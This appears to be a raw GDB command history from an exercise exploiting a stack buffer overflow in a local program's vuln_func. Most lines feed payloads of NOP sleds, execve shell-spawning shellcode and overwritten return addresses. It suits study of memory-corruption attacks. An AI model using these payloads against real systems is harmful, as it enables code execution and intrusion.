disas vuln_func
break * 0x00000000004011a9
run <<< $(python -c 'print "\x90"*80')
x/700wx $esp
run <<< $(python -c 'print "\x41"*80 + "\x42"*12')
c
run <<< $(python -c 'print "\x41"*80 + "\x42"*16')
c
run <<< $(python -c 'print "\x41"*80 + "\x42"*16')
c
run <<< $(python -c 'print "\x41"*80 + "\x42"*12')
c
quit
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x90"*8 + "\x20\xde\xff\xff\xff\x7f"')
quit
i r
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x90"*8 + "\x20\xde\xff\xff\xff\x7f"')
i r
x/300wx 0x7ffff7fb14c0
x/300wx $rbp
x/300wx $rip
q
q
run <<< (python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(100 - len(shellcode)) + shellcode + "\x90"*40 + "\x50\xde\xff\xff\xff\x7f"*10')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(100 - len(shellcode)) + shellcode + "\x90"*40 + "\x50\xde\xff\xff\xff\x7f"*10')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x90"*8 + "\x50\xde\xff\xff\xff\x7f"')
x/300wx $rip
x/300wx $rip-100
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x20\xde\xff\xff\xff\x7f"')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x20\xde\xff\xff\xff\x7f"')
x/300wx $rip
quit
out <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x20\xde\xff\xff\xff\x7f"')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x20\xde\xff\xff\xff\x7f"')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x90"*8 + "\x50\xde\xff\xff\xff\x7f"')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(80-len(shellcode)) + shellcode + "\x90"*8 + "\x20\xde\xff\xff\xff\x7f"')
x/300wx $rip
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(48 - len(shellcode)) + shellcode + "\x90"*40 + "\x20\xde\xff\xff\xff\x7f"*10')
x/300wx $rip
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(60 - len(shellcode)) + shellcode + "\x90"*28 + "\x20\xde\xff\xff\xff\x7f"*10')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(60 - len(shellcode)) + shellcode + "\x90"*28 + "\x20\xde\xff\xff\xff\x7f"')
x/300wx $rip
info frame
disas vuln_func
run <<< $(python -c 'print "\x90" * 5 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x51\x51\x51\x51" * 10')
x/200x ($rsp - 550)
x/200x $rsp
x/200x $rip
x/200x $rbp
x/300x $rsp
run <<< $(python -c 'print "\x90" * 21 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x51\x51\x51\x51" * 10')
run <<< $(python -c 'print "\x90" * 29 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x51\x51\x51\x51" * 10')
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(60 - len(shellcode)) + shellcode + "\x90"*28 + "\x20\xde\xff\xff\xff\x7f"*10')
quit
disas main
disas vuln_c
disas vuln_func
x/24wx $rsp
run <<< $(python -c 'shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; print "\x90"*(60 - len(shellcode)) + shellcode + "\x90"*28 + "\x20\xde\xff\xff\xff\x7f"*10')
x/24wx $rsp
x/24wx $esp
run <<< $(python -c 'print "A"*500')
x/24wx $esp
dosas main
disas main
break *0x08049238
run
run
run aaaaaaa
info frame
x/24wx $esp
run out
info frame
x/24wx $esp
info registers
quit
